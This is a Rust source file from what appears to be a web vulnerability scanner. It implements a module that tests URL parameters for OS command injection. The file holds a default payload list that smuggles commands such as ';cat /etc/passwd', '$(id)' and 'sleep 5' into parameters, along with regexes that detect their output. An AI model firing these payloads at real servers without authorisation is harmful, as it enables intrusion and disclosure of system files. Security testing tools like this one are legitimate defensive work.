use async_trait::async_trait;
use regex::Regex;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};
use crate::scanners::traits::VulnerabilityScanner;
use crate::core::crawler::CrawledPage;
use crate::reporting::models::Vulnerability;
use crate::error::VenomResult;

pub struct CmdiScanner {
    payloads_path: PathBuf,
}

impl CmdiScanner {
    pub fn new(payloads_path: &Path) -> Self {
        Self { payloads_path: payloads_path.to_path_buf() }
    }

    fn load_payloads(&self) -> Vec<String> {
        if let Ok(content) = std::fs::read_to_string(&self.payloads_path) {
            content.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty() && !l.starts_with('#')).collect()
        } else {
            default_cmdi_payloads()
        }
    }
}

#[async_trait]
impl VulnerabilityScanner for CmdiScanner {
    fn name(&self) -> &str { "Command Injection Scanner" }
    fn description(&self) -> &str { "Tests for OS Command Injection vulnerabilities" }

    async fn scan(
        &self,
        pages: &[CrawledPage],
        client: &reqwest::Client,
    ) -> VenomResult<Vec<Vulnerability>> {
        let mut vulns = Vec::new();
        let payloads = self.load_payloads();

        let cmdi_indicators = vec![
            Regex::new(r"root:.*:0:0:").unwrap(),          // /etc/passwd content
            Regex::new(r"uid=\d+.*gid=\d+").unwrap(),      // id command output
            Regex::new(r"Windows IP Configuration").unwrap(), // ipconfig output
            Regex::new(r"Directory of [A-Z]:\\").unwrap(),   // dir command output
            Regex::new(r"total \d+\s+drwx").unwrap(),       // ls -la output
            Regex::new(r"Linux version \d+").unwrap(),       // uname output
            Regex::new(r"PING \d+\.\d+\.\d+\.\d+").unwrap(),// ping output
        ];

        let cmd_params = vec!["cmd", "exec", "command", "execute", "ping",
            "query", "jump", "code", "reg", "do", "func", "arg", "option",
            "load", "process", "step", "read", "function", "req", "feature",
            "ip", "host", "hostname", "domain"];

        for page in pages {
            for (param_name, _) in &page.params {
                let param_lower = param_name.to_lowercase();
                let is_cmd_param = cmd_params.iter().any(|p| param_lower.contains(p));

                // Test all params but prioritize likely ones
                let payload_limit = if is_cmd_param { payloads.len() } else { 3 };

                for payload in payloads.iter().take(payload_limit) {
                    let test_url = inject_param(&page.url, param_name, payload);

                    if let Ok(resp) = client.get(&test_url).send().await {
                        if let Ok(body) = resp.text().await {
                            for indicator in &cmdi_indicators {
                                if indicator.is_match(&body) {
                                    vulns.push(create_cmdi_vuln(
                                        &page.url, param_name, payload,
                                        &format!("Command output detected: {}", indicator.as_str()),
                                    ));
                                    break;
                                }
                            }
                        }
                    }
                }

                // Time-based detection
                if is_cmd_param {
                    let time_payloads = vec![
                        ";sleep 5", "| sleep 5", "|| sleep 5",
                        "`sleep 5`", "$(sleep 5)",
                        "& ping -n 5 127.0.0.1 &", "| ping -n 5 127.0.0.1",
                    ];

                    for payload in &time_payloads {
                        let test_url = inject_param(&page.url, param_name, payload);
                        let start = Instant::now();
                        if let Ok(_) = client.get(&test_url).send().await {
                            if start.elapsed() >= Duration::from_secs(4) {
                                vulns.push(create_cmdi_vuln(
                                    &page.url, param_name, payload,
                                    &format!("Time-based detection: response delayed {:.1}s", start.elapsed().as_secs_f64()),
                                ));
                                break;
                            }
                        }
                    }
                }
            }
        }

        Ok(vulns)
    }
}

fn inject_param(url: &str, param: &str, payload: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let pairs: Vec<(String, String)> = parsed.query_pairs()
            .map(|(k, v)| {
                if k == param { (k.to_string(), payload.to_string()) }
                else { (k.to_string(), v.to_string()) }
            }).collect();
        parsed.query_pairs_mut().clear();
        for (k, v) in pairs { parsed.query_pairs_mut().append_pair(&k, &v); }
        parsed.to_string()
    } else { url.to_string() }
}

fn create_cmdi_vuln(url: &str, param: &str, payload: &str, evidence: &str) -> Vulnerability {
    let mut vuln = Vulnerability::new("OS Command Injection", "Command Injection", "CRITICAL", url);
    vuln.parameter = Some(param.to_string());
    vuln.payload = Some(payload.to_string());
    vuln.evidence = evidence.to_string();
    vuln.description = format!(
        "OS Command Injection was detected in the '{}' parameter. \
         The application passes user input to system shell commands.", param
    );
    vuln.impact = "An attacker can execute arbitrary operating system commands on the server, \
         leading to full system compromise, data theft, and lateral movement.".to_string();
    vuln.remediation = "1. Avoid calling OS commands from application code\n\
         2. Use language-specific APIs instead of shell commands\n\
         3. If unavoidable, use strict allowlists for permitted inputs\n\
         4. Never concatenate user input into command strings\n\
         5. Use parameterized command execution".to_string();
    vuln.cwe_id = Some("CWE-78".to_string());
    vuln.references = vec![
        "https://owasp.org/www-community/attacks/Command_Injection".to_string(),
    ];
    vuln
}

fn default_cmdi_payloads() -> Vec<String> {
    vec![
        ";id", "|id", "||id", "&id", "&&id",
        ";cat /etc/passwd", "|cat /etc/passwd",
        "`id`", "$(id)", "$(`id`)",
        ";ls -la", "|ls -la", ";uname -a",
        "| type C:\\Windows\\win.ini",
        ";ping -c 1 127.0.0.1", "| ping -n 1 127.0.0.1",
        "\nid", "\r\nid", "%0aid", "%0did",
        "a]|id|[b", "a)|id|(b",
    ].iter().map(|s| s.to_string()).collect()
}